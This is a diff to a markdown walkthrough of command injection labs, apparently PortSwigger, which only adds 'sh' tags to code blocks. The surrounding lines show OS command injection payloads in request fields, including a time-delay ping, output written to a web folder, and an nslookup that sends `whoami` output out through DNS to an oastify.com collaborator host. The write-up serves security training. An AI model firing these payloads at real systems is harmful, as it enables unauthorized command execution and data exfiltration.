@@ -17,7 +17,7 @@ Capture this request on burpsuite and send it over to burp repeater
 So the vulnerability lies in the storeId function.
 
 Checking payload all things I saw something on chaining commands, we can execute the ```whoami``` command by chaining it. So, we'll have something like this
-```
+```sh
 storeId=1|whoami
 ```
 Trying this
@@ -51,7 +51,7 @@ Lets capture this request and send it over to burp intruder
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e432dc1d-c393-4f04-a888-cb3f9490f4f5)
 
 We were told the vulnerability is in the feedback function. We'll be injecting the email section. we can use this payload to cause a 10 second delay
-```
+```sh
 ||ping -c 10 127.0.0.1||
 ```
 Applying that payload and ensuring it is url encoded
@@ -83,7 +83,7 @@ Capturing this request on burpsuite and sending it over to burp repeater
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ccbd0a4a-dbd4-4672-8001-7d891bcf0bbc)
 
 Now, we were given the writable folder to be ```/var/www/images``` and we are to execute the ```whoami``` command and then retrieve the output. So to write to that folder we can use the payload
-```
+```sh
 ||whoami > /var/www/images/abeg.txt||
 ```
 Ensure this is url encoded
@@ -129,7 +129,7 @@ so, to solve this lab we have to issue a DNS lookup to burp collaborator
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4fab75bf-9313-402e-b06c-527560ceff3e)
 
 Click on "copy to clipboard" to copy the payload to use. So we can use ```nslookup``` with the payload burp collaborator client generated for us
-```
+```sh
 ||nslookup 2ad7n17mkusj9u18hveevnj8zz5pte.oastify.com||
 ```
 Ensure it is url encoded
@@ -171,7 +171,7 @@ We have execute the ```whoami``` command and exfiltrate the output via a DNS que
 Click on "copy to clipboard" to copy the payload to use. So we can use ```nslookup``` with the payload burp collaborator client generated for us to run the ```whoami``` command.
 
 We can use the payload
-```
+```sh
 ||nslookup `whoami`.8clpqlx6r4oe0u0r87hwrnkonft5hu.oastify.com||
 ```
 Ensure this is url encoded
